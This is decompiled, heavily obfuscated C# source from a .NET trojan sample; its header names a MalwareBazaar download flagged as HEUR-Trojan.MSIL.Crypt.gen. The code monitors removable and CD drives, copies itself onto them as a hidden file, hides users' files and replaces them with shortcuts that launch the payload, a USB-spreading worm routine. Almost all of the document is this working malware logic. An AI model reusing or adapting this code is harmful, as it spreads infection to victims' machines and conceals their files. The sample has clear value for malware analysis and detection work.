// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ali, Version=1.0.0.0, Culture=neutral, PublicKeyToken=12dd377afffd921d
// MVID: DF9BD579-195B-41DD-BF3C-E2DB69459DB9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-d3162d2b2a78bf60a2cde68bef573ca602c3725e28d62f18392978a5c1e40318.exe

using \u0002;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0002
{
  internal sealed class \u0002
  {
    private bool \u0001;
    private Thread \u0001;
    public string \u0001;
    public Collection \u0001;
    [NonSerialized]
    internal static \u0004 \u0094;

    public \u0002()
    {
      this.\u0001 = false;
      this.\u0001 = (Thread) null;
      this.\u0001 = new Collection();
    }

    public void \u0001()
    {
label_0:
      if (false)
        goto label_3;
      else
        goto label_7;
label_1:
      bool flag;
      if (true)
      {
        if (flag)
        {
          this.\u0001 = new Thread(new ThreadStart(this.\u0003), 1);
          \u0088 obj = \u0088.\u007E\u0012\u0002;
          Thread thread = this.\u0001;
          if (true)
            obj((object) thread);
        }
        else
          goto label_4;
      }
      else
        goto label_5;
label_3:
label_4:
      if (false)
        goto label_1;
label_5:
      if (true)
      {
        if (true)
          return;
        goto label_4;
      }
      else
        goto label_0;
label_7:
      flag = this.\u0001 == null;
      goto label_1;
    }

    public void \u0002()
    {
      if (false)
        goto label_35;
label_34:
      this.\u0001 = true;
label_35:
      bool flag1;
      while (true)
      {
        int num = this.\u0001 != null ? 1 : 0;
        if (true)
          flag1 = num != 0;
        if (flag1)
          \u0010.\u001B(1);
        else
          break;
      }
      DriveInfo[] driveInfoArray = \u0083\u0002.\u001D\u0003();
      int index1 = 0;
      while (index1 < driveInfoArray.Length)
      {
        if (true)
        {
          DriveInfo driveInfo = driveInfoArray[index1];
          try
          {
            flag1 = \u0087.\u007E\u0008\u0002((object) driveInfo);
            if (flag1)
            {
              while (\u0084\u0002.\u007E\u001E\u0003((object) driveInfo) == DriveType.Removable | \u0084\u0002.\u007E\u001E\u0003((object) driveInfo) == DriveType.CDRom)
              {
                bool flag2 = \u007F\u0002.\u0019\u0003(\u0016.\u008E(\u0013.\u007E\u0089((object) driveInfo), this.\u0001));
                if (true)
                {
                  int num1 = flag2 ? 1 : 0;
                  while (true)
                  {
                    if (num1 != 0)
                      \u0086\u0002.\u001F\u0003(\u0016.\u008E(\u0013.\u007E\u0089((object) driveInfo), this.\u0001), FileAttributes.Normal);
                    else
                      goto label_11;
label_10:
                    \u001D\u0002.\u0015\u0003(\u0016.\u008E(\u0013.\u007E\u0089((object) driveInfo), this.\u0001));
label_11:
                    string[] strArray1 = \u0087\u0002.\u007F\u0003(\u0013.\u007E\u0089((object) driveInfo));
                    int index2 = 0;
                    while (index2 < strArray1.Length)
                    {
                      string str = strArray1[index2];
                      try
                      {
                        \u0086\u0002.\u001F\u0003(str, FileAttributes.Normal);
                        int num2 = \u0083.\u007E\u0003\u0002((object) \u0013.\u007E\u0082((object) str), \u0002.\u0002.\u0094(2208)) ? 1 : 0;
                        if (true)
                          num2 = num2 != 0 ? 1 : 0;
                        if (num2 != 0)
                          \u001D\u0002.\u0015\u0003(str);
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        \u0008.\u0015();
                      }
                      checked { ++index2; }
                      if (false)
                        goto label_27;
                    }
                    string[] strArray2 = \u0087\u0002.\u0080\u0003(\u0013.\u007E\u0089((object) driveInfo));
                    int num3 = 0;
                    if (num3 != 0)
                    {
                      num1 = num3;
                      continue;
                    }
                    int index3 = num3;
                    goto label_28;
label_27:
label_28:
                    if (index3 < strArray2.Length)
                    {
                      string path = strArray2[index3];
                      try
                      {
                        DirectoryInfo directoryInfo = new DirectoryInfo(path);
                        \u0088\u0002.\u007E\u0081\u0003((object) directoryInfo, FileAttributes.Normal);
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        \u0008.\u0015();
                      }
                      if (true)
                      {
                        checked { ++index3; }
                        goto label_27;
                      }
                      else
                        goto label_10;
                    }
                    else
                      goto label_29;
                  }
                }
              }
label_29:;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            \u0008.\u0015();
          }
          checked { ++index1; }
        }
        else
          goto label_34;
      }
    }

    public void \u0003()
    {
      this.\u0001 = (Thread) null;
      this.\u0002();
      this.\u0001 = \u0089\u0002.\u0082\u0003();
      this.\u0001 = false;
      while (!this.\u0001)
      {
        try
        {
          DriveInfo[] driveInfoArray1 = \u0083\u0002.\u001D\u0003();
          if (true)
            goto label_43;
label_2:
          int index1 = 0;
          DriveInfo[] driveInfoArray2;
          while (index1 < driveInfoArray2.Length)
          {
            DriveInfo driveInfo = driveInfoArray2[index1];
            \u0002.\u0002.\u0001 obj;
            if (!\u0083.\u007E\u0004\u0002((object) this.\u0001, \u0013.\u007E\u0082((object) \u0013.\u007E\u0089((object) driveInfo))))
            {
              obj = new \u0002.\u0002.\u0001();
              if (true)
              {
                obj.\u0001 = \u0013.\u007E\u0089((object) driveInfo);
                \u008A\u0002.\u007E\u0083\u0003((object) this.\u0001, (object) obj, \u0013.\u007E\u0082((object) \u0013.\u007E\u0089((object) driveInfo)), (object) null, (object) null);
              }
              else
                continue;
            }
            else
              obj = (\u0002.\u0002.\u0001) \u008B\u0002.\u007E\u0084\u0003((object) this.\u0001, \u0013.\u007E\u0082((object) \u0013.\u007E\u0089((object) driveInfo)));
            if (!this.\u0001)
            {
              try
              {
                if (\u0087.\u007E\u0008\u0002((object) driveInfo))
                {
                  bool flag = \u0015\u0002.\u007E\u0006\u0003((object) driveInfo) > 0L & \u0084\u0002.\u007E\u001E\u0003((object) driveInfo) == DriveType.Removable | \u0084\u0002.\u007E\u001E\u0003((object) driveInfo) == DriveType.CDRom;
                  if (flag)
                  {
                    try
                    {
                      if (!\u007F\u0002.\u0019\u0003(\u0016.\u008E(\u0013.\u007E\u0089((object) driveInfo), this.\u0001)))
                      {
                        \u0081.\u009E(\u0001.\u0004(), \u0016.\u008E(\u0013.\u007E\u0089((object) driveInfo), this.\u0001), true);
                        \u0086\u0002.\u001F\u0003(\u0016.\u008E(\u0013.\u007E\u0089((object) driveInfo), this.\u0001), FileAttributes.Hidden);
                      }
                      string[] strArray = \u0087\u0002.\u007F\u0003(\u0013.\u007E\u0089((object) driveInfo));
                      int index2 = 0;
                      while (true)
                      {
                        int num1 = index2 < strArray.Length ? 1 : 0;
                        if (false)
                          goto label_18;
                        else
                          goto label_35;
label_14:
                        string fileName;
                        int num2;
                        int num3;
                        if (num2 == num3 & \u0004.\u0011(\u0013.\u007E\u0082((object) fileName), \u0016.\u008E(\u0013.\u007E\u0082((object) \u0013.\u007E\u0089((object) driveInfo)), \u0013.\u007E\u0082((object) this.\u0001)), false) != 0)
                          flag = !obj.\u0001.Contains(\u0013.\u007E\u0086((object) new FileInfo(fileName)));
                        else
                          goto label_32;
label_16:
                        if (flag)
                        {
                          num1 = obj.\u0001.Count < 20 ? 1 : 0;
                        }
                        else
                        {
                          if (obj.\u0001.Contains(\u0013.\u007E\u0086((object) new FileInfo(fileName))))
                          {
                            flag = \u008C\u0002.\u0087\u0003(fileName) != FileAttributes.Hidden;
                            if (flag)
                              \u0086\u0002.\u001F\u0003(fileName, FileAttributes.Hidden);
                            if (!\u007F\u0002.\u0019\u0003(\u001A.\u0092(\u0013.\u007E\u0089((object) driveInfo), \u0013.\u007E\u0086((object) new FileInfo(fileName)), \u0002.\u0002.\u0094(2208))))
                              this.\u0001(driveInfo, fileName, this.\u0001(\u009A.\u008C\u0002(fileName)));
                            else if (\u0004.\u0011(\u009A.\u008B\u0002(\u001A.\u0092(\u0013.\u007E\u0089((object) driveInfo), \u0013.\u007E\u0086((object) new FileInfo(fileName)), \u0002.\u0002.\u0094(2208))), obj.\u0002[obj.\u0001.IndexOf(\u0013.\u007E\u0086((object) new FileInfo(fileName)))], false) != 0)
                              this.\u0001(driveInfo, fileName, this.\u0001(\u009A.\u008C\u0002(fileName)));
                          }
                          goto label_31;
                        }
label_18:
                        if (num1 != 0)
                        {
                          if (true)
                          {
                            this.\u0001(driveInfo, fileName, this.\u0001(\u009A.\u008C\u0002(fileName)));
                            obj.\u0001.Add(\u0013.\u007E\u0086((object) new FileInfo(fileName)));
                            \u0086\u0002.\u001F\u0003(fileName, FileAttributes.Hidden);
                            obj.\u0002.Add(\u009A.\u008B\u0002(\u001A.\u0092(\u0013.\u007E\u0089((object) driveInfo), \u0013.\u007E\u0086((object) new FileInfo(fileName)), \u0002.\u0002.\u0094(2208))));
                          }
                          else
                            goto label_16;
                        }
label_31:
label_32:
                        num2 = index2;
                        num3 = 1;
                        if (num3 != 0)
                        {
                          index2 = checked (num2 + num3);
                          continue;
                        }
                        goto label_14;
label_35:
                        if (num1 != 0)
                        {
                          fileName = strArray[index2];
                          int num4 = \u0004.\u0011(\u0013.\u007E\u0082((object) \u009A.\u008C\u0002(fileName)), \u0002.\u0002.\u0094(2208), false) == 0 ? 1 : 0;
                          num3 = 0;
                          num2 = num4;
                          goto label_14;
                        }
                        else
                          break;
                      }
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      \u0008.\u0015();
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                do
                {
                  \u0008.\u0015();
                }
                while (false);
              }
              checked { ++index1; }
            }
            else
              goto label_47;
          }
          goto label_45;
label_43:
          driveInfoArray2 = driveInfoArray1;
          goto label_2;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0008.\u0015();
        }
label_45:
        \u0010.\u001B(3000);
      }
label_47:
      this.\u0001 = (Thread) null;
    }

    public object \u0001([In] DriveInfo obj0, [In] string obj1, [In] string obj2)
    {
      try
      {
        \u001D\u0002.\u0015\u0003(\u001A.\u0092(\u0013.\u007E\u0089((object) obj0), \u0013.\u007E\u0086((object) new FileInfo(obj1)), \u0002.\u0002.\u0094(2208)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0008.\u0015();
      }
      object obj3 = global::\u0005.\u0012(\u008D\u0002.\u0088\u0003(\u0002.\u0002.\u0094(2217), \u0002.\u0002.\u0094(132)), (Type) null, \u0002.\u0002.\u0094(2238), new object[1]
      {
        (object) \u001A.\u0092(\u0013.\u007E\u0089((object) obj0), \u0013.\u007E\u0086((object) new FileInfo(obj1)), \u0002.\u0002.\u0094(2208))
      }, (string[]) null, (Type[]) null, (bool[]) null);
      \u0092.\u001F\u0002(obj3, (Type) null, \u0002.\u0002.\u0094(2259), new object[1]
      {
        (object) \u0002.\u0002.\u0094(1101)
      }, (string[]) null, (Type[]) null, false, true);
      \u0092.\u001F\u0002(obj3, (Type) null, \u0002.\u0002.\u0094(2276), new object[1]
      {
        (object) \u0002.\u0002.\u0094(132)
      }, (string[]) null, (Type[]) null, false, true);
      \u0092 obj4 = \u0092.\u001F\u0002;
      object obj5 = obj3;
      string str1 = \u0002.\u0002.\u0094(2301);
      object[] objArray1 = new object[1];
      object[] objArray2 = objArray1;
      string[] strArray = new string[5]
      {
        \u0002.\u0002.\u0094(2314),
        \u0018\u0002.\u007E\u0010\u0003((object) this.\u0001, \u0002.\u0002.\u0094(690), \u0002.\u0002.\u0094(2327)),
        \u0002.\u0002.\u0094(2332),
        \u0013.\u007E\u0087((object) new DirectoryInfo(obj1)),
        \u0002.\u0002.\u0094(2361)
      };
      string str2 = \u009E.\u0092\u0002(strArray);
      objArray2[0] = (object) str2;
      object[] objArray3 = objArray1;
      obj4(obj5, (Type) null, str1, objArray3, (string[]) null, (Type[]) null, false, true);
      \u0092.\u001F\u0002(obj3, (Type) null, \u0002.\u0002.\u0094(2374), new object[1]
      {
        (object) obj2
      }, (string[]) null, (Type[]) null, false, true);
      object obj6 = \u0006.\u0013(obj3, (Type) null, \u0002.\u0002.\u0094(2391), new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
      object obj7;
      return obj7;
    }

    public string \u0001([In] string obj0)
    {
      string str1;
      try
      {
        RegistryKey registryKey = \u008E\u0002.\u007E\u0089\u0003((object) Registry.LocalMachine, \u0002.\u0002.\u0094(2400), false);
        string str2 = \u001F.\u009B(\u0090\u0002.\u007E\u008B\u0003((object) \u008F\u0002.\u007E\u008A\u0003((object) registryKey, \u001F.\u009B(\u001E.\u0096(\u008B\u0002.\u007E\u0086\u0003((object) \u008E\u0002.\u007E\u0089\u0003((object) registryKey, obj0, false), \u0002.\u0002.\u0094(132)), (object) \u0002.\u0002.\u0094(2425)))), \u0002.\u0002.\u0094(132), (object) \u0002.\u0002.\u0094(132)));
        bool flag;
        if (true)
          flag = !\u0083.\u007E\u0001\u0002((object) str2, \u0002.\u0002.\u0094(768));
        if (flag)
          str2 = \u0016.\u008E(str2, \u0002.\u0002.\u0094(2446));
        str1 = str2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = \u0002.\u0002.\u0094(132);
        \u0008.\u0015();
      }
      return str1;
    }

    static \u0002()
    {
      do
      {
        \u0005.\u0002.\u0001(typeof (\u0002.\u0002));
        bool flag = false;
        Assembly assembly = \u0091\u0002.\u008C\u0003();
        \u0002.\u0002.\u0001(\u0013.\u007E\u008A((object) assembly), true, out flag);
        int num = flag ? 1 : 0;
        if (true)
        {
          if (num != 0)
            num = \u0083.\u007E\u0003\u0002((object) \u0013.\u007E\u008B((object) assembly), \u0002.\u0002.\u0094(2451)) ? 1 : 0;
          else
            goto label_5;
        }
        if (num != 0)
          continue;
label_5:
        throw new SecurityException(\u0002.\u0002.\u0094(2476));
      }
      while (false);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    public sealed class \u0001
    {
      public string \u0001;
      public List<string> \u0001;
      public List<string> \u0002;

      public \u0001()
      {
        this.\u0001 = new List<string>();
        this.\u0002 = new List<string>();
      }
    }
  }
}
